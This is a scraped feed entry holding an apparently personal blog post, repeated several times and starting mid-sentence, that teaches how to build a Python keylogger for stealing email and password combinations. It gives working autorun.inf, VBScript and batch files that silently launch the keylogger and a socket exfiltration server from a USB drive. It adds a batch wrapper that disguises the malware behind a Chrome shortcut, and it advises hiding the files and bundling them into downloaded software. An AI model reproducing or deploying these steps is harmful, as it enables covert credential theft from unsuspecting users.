keylogger program is created we have two<br>implementation methods\u200a\u2014\u200a1) Hardware Access 2) Software\u00a0Access</p>\n<p>1) Hardware Access\u200a\u2014\u200aIn this method of implementation we require a physical hardware device. In this case we need a USB\u00a0drive.</p>\n<p>2) Software Access-\u200a\u2014\u200aIn this method of implementation we will not require a physical hardware device, we can attach our virus to any program/application.</p>\n<p>Keylogger Program- To create a keylogger program we need to install python firstly. An external library \u201cPynput\u201d is required to record keystrokes. Pynput can be installed just by running command prompt as administrator and pasting a command\u00a0: <strong><em>pip3 install\u00a0pynput</em></strong></p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*ixgxY_d18DuCYyiyH1znNA.jpeg\"></figure><p>Now create a new file and paste the following code\u00a0:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/749/1*T4Owxp0foTJLivS5ZHWIKQ.png\"></figure><p>Save the file with extension as\u00a0.pyw, to run is silently in the<br>background without the user knowing.<br>Here, on_press() method is triggered when a key is pressed. The key is<br>appended in a list called keys. We have a method called on_release()<br>which detects if esc key is pressed. If yes the program would be<br>terminated. Also we have a count variable which will trigger another user<br>defined method called write_file(). This method will write all the<br>recorded keystroked into a text file called\u00a0log.txt.</p>\n<p>Bad USB- The USB has to be added with some scripts that autoruns when a<br>USB is plugged in. However before that we need to make python portable<br>since not every computer will have python installed. So for that we will<br>add portable python (i.e WinPython64 or WinPython64) files to the\u00a0USB.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*nS1Gil5YJxQUy9h1WlX4VA.jpeg\"></figure><p>Here firstly we create an autorun file which would then automatically trigger a visual basic script file when the usb is plugged in. This vbs file then triggers 2 more windows batch files containing a trigger for keylogger program and a trigger for socket programming file.</p>\n<p>Paste the following codes</p>\n<p><strong>Autorun.inf\u00a0:</strong><br><em>[autorun]<br>open=abc.vbs</em></p>\n<p><strong>abc.vbs\u00a0:</strong><br><em>Set WshShell = CreateObject(\u201cWScript.Shell\u201d)<br>WshShell.Run chr(34) &amp; \u201cI:\\start.bat\u201d &amp; Chr(34), 0<br>Set WshShell = Nothing<br>Wscript.sleep 10000<br>Set WshShell = CreateObject(\u201cWScript.Shell\u201d)<br>WshShell.Run chr(34) &amp; \u201cI:\\server.bat\u201d &amp; Chr(34), 0<br>Set WshShell =\u00a0Nothing</em></p>\n<p>Here, We are creating a WshShell object eveytime we want to<br>trigger a file, then we add filename along with location. Most<br>importantly we set WshShell to Nothing since we want our files<br>to run in background. Also since we want a delay of 10seconds<br>between execution of files we add the line Wscript.sleep<br>10000, where 10000 is time in milliseconds.</p>\n<p><strong>start.bat\u00a0:</strong><br><em>@echo off<br>python\u00a0try4.pyw</em></p>\n<p><strong>server.bat\u00a0:</strong><br><em>@echo off<br>python server.py</em></p>\n<p>The @echo off line ensures that the files are executed in the<br>background.<br>Also for added security we can hide these files by <em>selecting<br>all files -&gt; right click -&gt; properties -&gt; tick the Hidden</em><br>property.</p>\n<p>Chrome Virus:<br>Create a desktop shortcut of the chrome application from the<br>path <em>C:\\Program Files(x86)\\Google\\Chrome\\Application</em></p>\n<p><strong>Then create a windows batch file (.bat) file with the<br>following code:</strong><br><em>@echo off<br>start \u201c\u201d \u201cC:\\Program Files<br>(x86)\\Google\\Chrome\\Application\\chrome.exe\u201d<br>pushd %~dp0<br>cscript\u00a0abc.vbs</em></p>\n<p>This would trigger the chrome application and the the abc.vbs<br>script which would the trigger keylogger and socket python<br>files.<br>A possible way on implementing this is one can upload a<br>software and add the malware files with the software file, now<br>when the target downloads the software and executes it the<br>keylogger would also get executed.</p>\n<p><strong>Socket Programming\u00a0:</strong><br>When the keylogger would be executed it would generate a<br>log.txt file which has all the recorded keystrokes. However<br>this log file will be present on the target pc and not the<br>hacker\u2019s pc. Here socket programming come into place. The log<br>file is transferred from the target to hacker\u2019s pc with help<br>of socket programming.<br>We have 2 Files for Socket programming 1) Server side<br> 2) Client\u00a0side</p>\n<p>Serverside.py</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/606/1*-AYPgubJ9GnwhXn_Mv4hlg.png\"></figure><p>Clientside.py</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/607/1*vDE__I1Px1VBGic6eAUVRQ.png\"></figure><p>Also Hacker can apply some algorithms to find email<br>combinations<br>Example:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/708/1*jWVa7t6VuMjH5Garieagew.png\"></figure><p>TUTORIAL VIDEO:</p>\n<a href=\"https://medium.com/media/c3361eed42d811a784ab7570f28e3bbf/href\">https://medium.com/media/c3361eed42d811a784ab7570f28e3bbf/href</a><p>GET ALL FILES RELATED TO THIS POST\u00a0: <a href=\"https://github.com/Raj-Mehta2012/PythonKeylogger-BadUSB-ChromeVirus\">CLICK\u00a0HERE</a></p>\n<p>VISIT MY BLOGS: <a href=\"http://8bitblogs.unaux.com/\">CLICK\u00a0HERE</a></p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=274b4f4f6724\" width=\"1\" height=\"1\" alt=\"\">\n","content":"\n<h3>PythonKeylogger- BadUSB + ChromeVirus</h3>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/805/1*NSBAVM0oG1Lqkx_Ewrkg8A.jpeg\"></figure><p>This program is used to record email id and password combinations so that the hacker could easily exploit the data.<br>Keylogger- A Keylogger is a program that records activity of the target. In simple words Keylogger program records all the keys pressed on keyboard. Not only does it record keys from the physical keyboard but also from virtual/on-screen keyboards.<br>Bad USB- Bad USB is a physical pendrive when plugged in executes some malware files/program. Here we are executing our keylogger file on USB plugin.<br>Virus- A program that when executed makes modifies or read some files without the user knowing is called virus. Here we are going to attach our virus file (i.e Keylogger) to chrome application so when chrome is executed the virus also executes in the background.</p>\n<p><strong>WHY MAKE THIS / REAL-LIFE IMPLEMENTATION\u00a0:</strong></p>\n<p>Since in the so called 21st century almost all life tasks are carried on digitally. However it hasn\u2019t been more simpler for a hacker to exploit users. It is very important to spread awareness about one of the method of data stealing.</p>\n<p><strong>TECHNOLOGY USED\u00a0:</strong></p>\n<p>Python, Portable Python (PyWin32/ PyWin64), Visual Basic Scripting, Socket Programming, USB\u00a0device.</p>\n<p><strong>PROCEDURE\u00a0:</strong></p>\n<p>We first code a keylogger file in Python. Once the keylogger program is created we have two<br>implementation methods\u200a\u2014\u200a1) Hardware Access 2) Software\u00a0Access</p>\n<p>1) Hardware Access\u200a\u2014\u200aIn this method of implementation we require a physical hardware device. In this case we need a USB\u00a0drive.</p>\n<p>2) Software Access-\u200a\u2014\u200aIn this method of implementation we will not require a physical hardware device, we can attach our virus to any program/application.</p>\n<p>Keylogger Program- To create a keylogger program we need to install python firstly. An external library \u201cPynput\u201d is required to record keystrokes. Pynput can be installed just by running command prompt as administrator and pasting a command\u00a0: <strong><em>pip3 install\u00a0pynput</em></strong></p>\n<p><strong>INTRODUCTION\u00a0:</strong></p>\n<p>This program is used to record email id and password combinations so that the hacker could easily exploit the data.<br>Keylogger- A Keylogger is a program that records activity of the target. In simple words Keylogger program records all the keys pressed on keyboard. Not only does it record keys from the physical keyboard but also from virtual/on-screen keyboards.<br>Bad USB- Bad USB is a physical pendrive when plugged in executes some malware files/program. Here we are executing our keylogger file on USB plugin.<br>Virus- A program that when executed makes modifies or read some files without the user knowing is called virus. Here we are going to attach our virus file (i.e Keylogger) to chrome application so when chrome is executed the virus also executes in the background.</p>\n<p><strong>WHY MAKE THIS / REAL-LIFE IMPLEMENTATION\u00a0:</strong></p>\n<p>Since in the so called 21st century almost all life tasks are carried on digitally. However it hasn\u2019t been more simpler for a hacker to exploit users. It is very important to spread awareness about one of the method of data stealing.</p>\n<p><strong>TECHNOLOGY USED\u00a0:</strong></p>\n<p>Python, Portable Python (PyWin32/ PyWin64), Visual Basic Scripting, Socket Programming, USB\u00a0device.</p>\n<p><strong>PROCEDURE\u00a0:</strong></p>\n<p>We first code a keylogger file in Python. Once the keylogger program is created we have two<br>implementation methods\u200a\u2014\u200a1) Hardware Access 2) Software\u00a0Access</p>\n<p>1) Hardware Access\u200a\u2014\u200aIn this method of implementation we require a physical hardware device. In this case we need a USB\u00a0drive.</p>\n<p>2) Software Access-\u200a\u2014\u200aIn this method of implementation we will not require a physical hardware device, we can attach our virus to any program/application.</p>\n<p>Keylogger Program- To create a keylogger program we need to install python firstly. An external library \u201cPynput\u201d is required to record keystrokes. Pynput can be installed just by running command prompt as administrator and pasting a command\u00a0: <strong><em>pip3 install\u00a0pynput</em></strong></p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*ixgxY_d18DuCYyiyH1znNA.jpeg\"></figure><p>Now create a new file and paste the following code\u00a0:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/749/1*T4Owxp0foTJLivS5ZHWIKQ.png\"></figure><p>Save the file with extension as\u00a0.pyw, to run is silently in the<br>background without the user knowing.<br>Here, on_press() method is triggered when a key is pressed. The key is<br>appended in a list called keys. We have a method called on_release()<br>which detects if esc key is pressed. If yes the program would be<br>terminated. Also we have a count variable which will trigger another user<br>defined method called write_file(). This method will write all the<br>recorded keystroked into a text file called\u00a0log.txt.</p>\n<p>Bad USB- The USB has to be added with some scripts that autoruns when a<br>USB is plugged in. However before that we need to make python portable<br>since not every computer will have python installed. So for that we will<br>add portable python (i.e WinPython64 or WinPython64) files to the\u00a0USB.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*nS1Gil5YJxQUy9h1WlX4VA.jpeg\"></figure><p>Here firstly we create an autorun file which would then automatically trigger a visual basic script file when the usb is plugged in. This vbs file then triggers 2 more windows batch files containing a trigger for keylogger program and a trigger for socket programming file.</p>\n<p>Paste the following codes</p>\n<p><strong>Autorun.inf\u00a0:</strong><br><em>[autorun]<br>open=abc.vbs</em></p>\n<p><strong>abc.vbs\u00a0:</strong><br><em>Set WshShell = CreateObject(\u201cWScript.Shell\u201d)<br>WshShell.Run chr(34) &amp; \u201cI:\\start.bat\u201d &amp; Chr(34), 0<br>Set WshShell = Nothing<br>Wscript.sleep 10000<br>Set WshShell = CreateObject(\u201cWScript.Shell\u201d)<br>WshShell.Run chr(34) &amp; \u201cI:\\server.bat\u201d &amp; Chr(34), 0<br>Set WshShell =\u00a0Nothing</em></p>\n<p>Here, We are creating a WshShell object eveytime we want to<br>trigger a file, then we add filename along with location. Most<br>importantly we set WshShell to Nothing since we want our files<br>to run in background. Also since we want a delay of 10seconds<br>between execution of files we add the line Wscript.sleep<br>10000, where 10000 is time in milliseconds.</p>\n<p><strong>start.bat\u00a0:</strong><br><em>@echo off<br>python\u00a0try4.pyw</em></p>\n<p><strong>server.bat\u00a0:</strong><br><em>@echo off<br>python server.py</em></p>\n<p>The @echo off line ensures that the files are executed in the<br>background.<br>Also for added security we can hide these files by <em>selecting<br>all files -&gt; right click -&gt; properties -&gt; tick the Hidden</em><br>property.</p>\n<p>Chrome Virus:<br>Create a desktop shortcut of the chrome application from the<br>path <em>C:\\Program Files(x86)\\Google\\Chrome\\Application</em></p>\n<p><strong>Then create a windows batch file (.bat) file with the<br>following code:</strong><br><em>@echo off<br>start \u201c\u201d \u201cC:\\Program Files<br>(x86)\\Google\\Chrome\\Application\\chrome.exe\u201d<br>pushd %~dp0<br>cscript\u00a0abc.vbs</em></p>\n<p>This would trigger the chrome application and the the abc.vbs<br>script which would the trigger keylogger and socket python<br>files.<br>A possible way on implementing this is one can upload a<br>software and add the malware files with the software file, now<br>when the target downloads the software and executes it the<br>keylogger would also get executed.</p>\n<p><strong>Socket Programming\u00a0:</strong><br>When the keylogger would be executed it would generate a<br>log.txt file which has all the recorded keystrokes. However<br>this log file will be present on the target pc and not the<br>hacker\u2019s pc. Here socket programming come into place. The log<br>file is transferred from the target to hacker\u2019s pc with help<br>of socket programming.<br>We have 2 Files for Socket programming 1) Server side<br> 2) Client\u00a0side</p>\n<p>Serverside.py</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/606/1*-AYPgubJ9GnwhXn_Mv4hlg.png\"></figure><p>Clientside.py</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/607/1*vDE__I1Px1VBGic6eAUVRQ.png\"></figure><p>Also Hacker can apply some algorithms to find email<br>combinations<br>Example:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/708/1*jWVa7t6VuMjH5Garieagew.png\"></figure><p>TUTORIAL VIDEO:</p>\n<a href=\"https://medium.com/media/c3361eed42d811a784ab7570f28e3bbf/href\">https://medium.com/media/c3361eed42d811a784ab7570f28e3bbf/href</a><p>GET ALL FILES RELATED TO THIS POST\u00a0: <a href=\"https://github.com/Raj-Mehta2012/PythonKeylogger-BadUSB-ChromeVirus\">CLICK\u00a0HERE</a></p>\n<p>VISIT MY BLOGS: <a href=\"http://8bitblogs.unaux.com/\">CLICK\u00a0HERE</a></p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=274b4f4f6724\" width=\"1\" height=\"1\" alt=\"\">\n","enclosure":{},"categories":["virus","socket-programming","hacking","python","keylogger"]}]}